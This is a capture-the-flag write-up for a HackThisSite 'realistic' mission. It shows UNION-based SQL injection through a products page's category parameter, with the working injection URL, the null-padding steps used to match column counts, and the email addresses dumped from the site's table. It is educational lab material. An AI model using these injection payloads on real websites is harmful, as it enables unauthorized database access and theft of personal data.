Since we are supposed to be using sql injections, we try to enter sql code to the 'add email' field. This doesn't work though, only outputting:
Error inserting into table "email"! Email not valid! Please contact an administrator of Fischer's

However, this gives us the name of the table we are interested in: 'email'.

Browsind the website we discover there is another way to interact with the database: the url of the 'products' pages. Adding
union select * from products
like so:
https://www.hackthissite.org/missions/realistic/4/products.php?category=2%20union%20select%20*%20from%20products
leads to a website that displays all products. So we are on the right track.

By using UNION ALL we can output another table - the only catch: the number of colums need to match. So we just try
UNION ALL SELECT * FROM email
adding ',null' after '*' until we get a valid output. This happens for
UNION ALL SELECT *,null,null,null FROM email
We do not get any information yet, the reason being that the correct column does not get displayed. By moving the columns around
UNION ALL SELECT null,*,null,null FROM email
we get the addresses displayed as the product description text:
 	 	alph-alpha-brown@hotmail.com
	 	sam.goodwin@yahoo.com
        UltraDeathLaser@aol.com
	 	SwingLow@hotmail.com
	 	TeaBody@aol.com
	 	jsmith@uic.edu 
	 	3ambeer@graffiti.net
	 	shootfirst@yahoo.com
	 	Bobby@friends.com
    
To complete the mission, a message with these addresses was sent to SaveTheWhales:
